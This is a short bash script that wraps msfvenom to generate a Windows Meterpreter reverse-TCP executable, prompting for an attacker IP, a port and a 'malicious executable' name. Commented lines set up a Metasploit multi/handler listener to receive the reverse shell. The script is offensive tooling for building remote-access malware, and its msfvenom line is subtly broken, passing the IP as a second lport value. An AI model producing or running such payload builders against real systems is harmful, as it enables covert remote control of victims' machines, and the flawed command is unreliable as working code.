#!/bin/bash
# clear
# service postgresql start
# echo -n "enter your ip address:"
read ip
# echo -n "Enter the desired  port: "
read port
# echo -n "Enter your malicious executable's name : "
read name

# echo "Generating payload.... "
msfvenom -p windows/meterpreter/reverse_tcp lport=$ip lport=$port -f exe > $name.exe

check=($(ls | grep $name.exe))


echo "Payload Generated "
echo "Here is your Exe :" $check


        # echo ":download your payload from 192.168.172.133:8000"
        # echo "use exploit/multi/handler
# set PAYLOAD windows/meterpreter/reverse_tcp
# set LHOST" ""$ip"
# set LPORT" ""$port"
# set ExitOnSession false
# exploit -j -z
# sessions -i 1 | tee listenerw.rc


# echo "Now Starting Msf multi/handler for the above !"
# msfconsole -r listenerw.rc